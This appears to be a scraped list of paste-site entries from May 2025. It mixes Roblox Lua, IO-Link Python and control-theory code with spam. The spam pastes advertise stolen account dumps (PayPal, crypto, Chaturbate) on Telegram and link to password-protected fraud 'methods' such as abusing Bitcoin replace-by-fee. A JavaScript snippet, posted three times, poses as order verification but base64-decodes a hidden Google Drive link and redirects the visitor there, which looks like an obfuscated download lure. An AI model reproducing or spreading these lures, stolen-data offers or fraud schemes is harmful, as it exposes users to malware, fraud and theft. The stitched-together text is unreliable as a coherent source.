	for _, element in ipairs(container:GetChildren()) do
		if element:IsA(""BasePart"") then
			local parts = string.split(element.Name, "" "")
			local prefix, number = parts[1], tonumber(parts[2])
			if string.lower(prefix) == ""destination"" and number and number < smallestIndex then
				smallestIndex = number
				nextTarget = element
			end
		end
	end

	if nextTarget then
		table.insert(pathPoints, nextTarget.CFrame)
		if shouldRemoveTargets then
			nextTarget:Destroy()
		else
			nextTarget.Name = ""Target""
		end
	end
until not nextTarget

positionController.MaxVelocity = velocityCap
orientationController.MaxAngularVelocity = angularVelocityCap
positionController.Position = pathPoints[1].Position
orientationController.CFrame = pathPoints[1].Rotation
mover.Anchored = false

while true do
	for i = 1, #pathPoints do
		local frame = pathPoints[i]
		positionController.Position = frame.Position
		orientationController.CFrame = frame.Rotation
		task.wait(travelInterval)
	end
end
"
3yrjjz60,Chaturbate with Tokens,iLoveToWatch,JavaScript,Monday 5th of May 2025 04:50:17 AM CDT,49265 Accounts Posted On https://t.me/leakzbyeminem
bzhxvqBh,Abuse RBF in BTC transactions,luqlegal,JavaScript,Monday 5th of May 2025 04:50:16 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 55944
U2tqEuvb,Untitled,navrajkhunger,JavaScript,Monday 5th of May 2025 04:50:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/31621/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HYuLDf5u,IO-Link AL1900 + Patlite,DeaD_EyE,Python,Monday 5th of May 2025 04:45:34 AM CDT,"import time
from enum import IntEnum
from itertools import islice


# https://git.fh-aachen.de/io-link/iolink-ifm-master-python
from IOT_Master import IOT_Master as Master


MASTER_IP = ""10.215.200.95""


class Color(IntEnum):
    off = 0
    red = 1
    green = 2
    yellow = 3
    blue = 4
    purple = 5
    cyan = 6
    white = 7


class Mode(IntEnum):
    normal = 0
    blink_500ms = 1
    blink_250ms = 2
    blink_125ms = 3
    flash_single = 4
    flash_double = 5
    flash_triple = 6
    sine_slow = 7
    sine_fast = 8

class Buzzer(IntEnum):
    silent = 0
    continuous = 1
    call_sign = 2
    rapid_hi_lo = 3
    sweep = 4
    cont_beep_500ms = 5
    rapid_beep = 6
    rapid_hi_lo_500ms = 7
    sweep_500ms = 8


def signal_light(master: Master, channel: int, color: Color, mode: Mode):
    """"""
    Signal light: https://www.patlite.eu/product/detail0000000710.html
    IOT-Master: https://www.ifm.com/de/de/product/AL1900
    """"""
    master.setPDout(channel, (color | mode << 4).to_bytes(2, ""big""))


def main():
    iot = Master(MASTER_IP)
    # signal_light(iot, 1, Color.green, Mode.blink_500ms)

    for mode in Mode:
        for color in islice(Color, 1, None):
            signal_light(iot, 1, color, mode)
            print(f""{color=!r} | {mode=!r}"")
            time.sleep(5)
    

if __name__ == ""__main__"":
    main()
"
6n64cCCW,Untitled,shmile03,Python,Monday 5th of May 2025 04:42:16 AM CDT,"Ad = np.array([[ 1.00000000e+00,  2.68170103e-02,  9.08934014e-02,
        -6.77884181e-04],
       [ 0.00000000e+00,  1.11897831e+00, -1.74689726e-03,
         9.69312804e-02],
       [ 0.00000000e+00,  5.17634358e-01,  8.23599851e-01,
        -3.86676206e-03],
       [ 0.00000000e+00,  2.36782487e+00, -3.37194203e-02,
         9.78620935e-01]])
Bd = np.array([[0.02927989],
       [0.00561669],
       [0.56716864],
       [0.108416  ]])

def obs_d_sys_creator(A, B, C, mu_ctrl = None, mu_obs = None, D = None):
    theta = control.place(A, B, mu_ctrl) *(-1) if (not mu_ctrl is None) else np.matrix(np.zeros(A.shape[1]))
    L = control.place(A.T, C.T, mu_obs).T  if (not mu_obs is None) else np.matrix(np.zeros(A.shape[1])).T

    my_min = lambda x,y: (min(x[0],y[0]),min(x[1],y[1]))

    if D is None:
        D = np.zeros(A.shape[0])
    sys_matrix = np.block([
        [A, B@theta],
        [L@C,B@theta+ A - L@C]
    ])
    def rhs(X):
        X = np.matrix(X)
        return (sys_matrix@X.T).T
    return rhs

Cd = np.matrix([
    [1,0,0,0],
    [0,1,0,0]
])

eigs = np.linalg.eigvals(Ad)
display(eigs)
mu_ctrl = copy(eigs.tolist())
mu_obs = copy(mu_ctrl)

#case 1:(a)
mu_obs[0] = -0.1
mu_obs[1] = -0.2
#case 2:(b)
mu_obs[0] = 0.8 +0.3j
mu_obs[1] = 0.8 - 0.3j
#case 3:(c)
mu_obs[0] = -0.1
mu_obs[1] = 1

mu_ctrl[0] =  0.8 + 0.3j
mu_ctrl[1] =  0.8 - 0.3j

obs_dis_sys = obs_d_sys_creator(Ad,Bd,Cd, mu_ctrl = mu_ctrl, mu_obs = mu_obs)

L_coefs = control.place(Ad.T, Cd.T, mu_obs).T
control_coefs = -control.place(Ad,Bd, mu_ctrl)
control_coefs

discret_t_arr = np.arange(0,4+0.1,h)
discret_y0 = (0,np.pi/20,0,0,0,0,0,0)

discret_y = [discret_y0]
for i in range(1,len(discret_t_arr)):
    cur_x = obs_dis_sys(discret_y[-1])
    discret_y.append(cur_x.tolist()[0])
discret_y = np.matrix(discret_y).T
#display(discret_y.shape)
u_arr = np.block([(control_coefs@x[0,4:8].T)[0,0] for x in discret_y.T][:-1])
u_arr

def to_plot_arr(arr_1, arr_2):
    plot_arr_1 = np.block([
        np.matrix(arr_1).T[:-1], np.matrix(arr_1).T[1:]
    ])

    plot_arr_2 = np.block([
        np.matrix(arr_2).T,np.matrix(arr_2).T
    ])
    return plot_arr_1.ravel().tolist()[0], plot_arr_2.ravel().tolist()[0]

#используя полученные коэффициенты управления построим непрерывную линейную систему
def discret_controled_system(A,B,u):
    def rhs(t,X):
        X = np.matrix(X)
        return (A@X.T+B*u).T
    return rhs

lin_sol_arr = []
cur_start_pos = discret_y0[:4]

cur_t_limits = [0,0]

for t,u in zip(discret_t_arr[1:],u_arr):
    discret_controled_lin_sys = discret_controled_system(nA,nB,u)
    cur_t_limits[0] = cur_t_limits[1]
    cur_t_limits[1] = t
    cur_sol = solve_ivp(discret_controled_lin_sys,y0 = cur_start_pos, t_span = cur_t_limits, t_eval = np.linspace(*cur_t_limits,10), rtol = 1e-12)
    cur_start_pos = cur_sol.y[:,-1]
    lin_sol_arr.append(cur_sol)

lin_t_arr = np.block([x.t for x in lin_sol_arr])
lin_y_arr = np.block([x.y for x in lin_sol_arr])

from tqdm import tqdm
#символьное вычисление функций
#theta_ddot_func, phi_ddot_func = non_lin_theta_phi_funcs(lhs_1, lhs_2)
#определение н.у.
cur_start_pos = discret_y0[:4]
cur_t_limits = [0,0]

non_lin_sol_arr = []
for t,u in tqdm(zip(discret_t_arr[1:],u_arr)):
    #расчёт системы для текущих н.у.
    controled_theta_ddot_func = theta_ddot_func.subs(parameters).subs({V:u})
    controled_phi_ddot_func = phi_ddot_func.subs(parameters).subs({V:u})
    theta_ddot_lamb, phi_ddot_lamb = non_lin_sys_lambdify(controled_theta_ddot_func, controled_phi_ddot_func)
    non_lin_sys = non_lin_sys_creator(theta_ddot_lamb, phi_ddot_lamb)

    cur_t_limits[0] = cur_t_limits[1]
    cur_t_limits[1] = t
    #численное решение
    non_lin_sol = solve_ivp(fun = non_lin_sys,y0 = cur_start_pos,t_span = cur_t_limits, t_eval = np.linspace(*cur_t_limits,10), rtol = 1e-12)
    cur_start_pos = non_lin_sol.y[:,-1]

    non_lin_sol_arr.append(non_lin_sol)

non_lin_t_arr = np.block([x.t for x in non_lin_sol_arr])
non_lin_y_arr = np.block([x.y for x in non_lin_sol_arr])

fig, ax = plt.subplots(5,2,figsize = (20,10))
ylabel_params = [r'\theta',r'\varphi',r'\dot{\theta}',r'\dot{\varphi}','V']
for i in range(len(ylabel_params)):
    ax[i,0].set_ylabel(f""${ylabel_params[i]}$"")
    ax[i,1].set_ylabel(f""${ylabel_params[i]}$"")


for i,y in enumerate(non_lin_y_arr):
    ax[i,0].plot(non_lin_t_arr,y, color = 'green', label = 'состояние нелин.')
for i in range(4):
    cur_y = discret_y[4+i,:-1]
    x,y = to_plot_arr(discret_t_arr,cur_y)
    ax[i,0].plot(x,y, color = 'orange',linestyle='--', label = 'состояние наблюдателя.')
for i in range(4):
    cur_y = discret_y[i,:-1]
    x,y = to_plot_arr(discret_t_arr,cur_y)
    ax[i,0].plot(x,y, color = 'pink',linestyle='--', label = 'состояние дискр. сис')
for i in range(4):
    cur_y1 = discret_y[i,:-1]
    cur_y2 = discret_y[i+4,:-1]
    x,y = to_plot_arr(discret_t_arr,abs(cur_y2-cur_y1))
    ax[i,1].plot(x,y, color = 'pink',linestyle='--', label = 'невязка наблюдателя')


for i,y in enumerate(lin_y_arr):
    ax[i,0].plot(lin_t_arr,y, color = 'red', label = 'состояние лин.')

ax[4,0].plot(*to_plot_arr(discret_t_arr,u_arr))
ax[0,0].legend()"
KrQWiJQ2,Crypto Accounts,iLoveToWatch,JavaScript,Monday 5th of May 2025 04:34:55 AM CDT,81543 Accounts Posted On https://t.me/leakzbyeminem
a4drhyzz,Stake Free Balance Method,luqlegal,JavaScript,Monday 5th of May 2025 04:34:55 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 41720
MKYghxr5,Market.js,luqlegal,JavaScript,Monday 5th of May 2025 04:34:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/98059/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KZiZYqSm,PayPal with Balance,iLoveToWatch,JavaScript,Monday 5th of May 2025 04:19:34 AM CDT,19153 Accounts Posted On https://t.me/leakzbyeminem
fx6U9Lfa,Abuse RBF in BTC transactions,iLoveToWatch,JavaScript,Monday 5th of May 2025 04:19:29 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 49108
aSvGd63e,Untitled,luqlegal,JavaScript,Monday 5th of May 2025 04:19:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/80857/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
beWmtNPa,Untitled,shmile03,Python,Monday 5th of May 2025 04:08:44 AM CDT,"import numpy as np
import control
import matplotlib.pyplot as plt

# 1) Задаём параметры
A = np.array([[0,      0,       1,      0],
              [0,      0,       0,      1],
              [0, 5.8773, -1.9436, -0.3484],
              [0, 24.5313, -0.3823, -1.4543]])
B = np.array([[0],
              [0],
              [6.2491],
              [1.2311]])
Q = np.diag([100, 0, 0, 0])
R = np.array([[1]])

# 2) Решаем LQR — получаем K, решение Риккати X и собственные числа E
K, X, E = control.lqr(A, B, Q, R)

# 5) Начальные условия и временная сетка
x0 = [0, np.pi/17, 0, 0]
t = np.linspace(0, 10, 1001)

#
control_coefs = -K

theta_ddot_func, phi_ddot_func = non_lin_theta_phi_funcs(lhs_1, lhs_2)
theta_ddot_func = theta_ddot_func.subs(parameters)
phi_ddot_func = phi_ddot_func.subs(parameters)

controled_theta_ddot_func = add_control(theta_ddot_func,control_coefs)
controled_phi_ddot_func = add_control(phi_ddot_func,control_coefs)

theta_ddot_lamb = sp.lambdify(vars_vector, controled_theta_ddot_func)
phi_ddot_lamb = sp.lambdify(vars_vector, controled_phi_ddot_func)

non_lin_sys = non_lin_sys_creator(theta_ddot_lamb, phi_ddot_lamb)

non_lin_sol = solve_ivp(fun = non_lin_sys,y0 = x0[:4],t_span = (t[0],t[-1]), t_eval = t, rtol = 1e-2)
#


# 3) Замкнутая матрица системы
A_cl = A - B @ K

# 4) Формируем модель состояния-выхода для замкнутой системы
#    Здесь C=I, D=0 чтобы на выходе видеть сами состояния
C = np.eye(4)
D = np.zeros((4, 1))
sys_cl = control.ss(A_cl, B, C, D)

# 6) Моделируем свободную (нулевой вход) динамику системы от x0
t_out, y_out = control.initial_response(sys_cl, T=t, X0=x0)

# 7) Рисуем 4 графика переменных состояния
labels = [r'$\theta$', r'$\varphi$', r'$\dot{\theta}$', r'$\dot{\varphi}$']
fig, axes = plt.subplots(4, 1, figsize=(8, 10), sharex=True)

for i in range(4):
    axes[i].plot(t_out, y_out[i, :], 'b', label=""линейная"")
    axes[i].plot(non_lin_sol[""t""], non_lin_sol[""y""][i], 'r', label=""нелинейная"")
    axes[i].set_ylabel(labels[i], fontweight='bold')
    axes[i].legend()
    axes[i].set_xlabel('t')

#plt.tight_layout()
plt.show()"
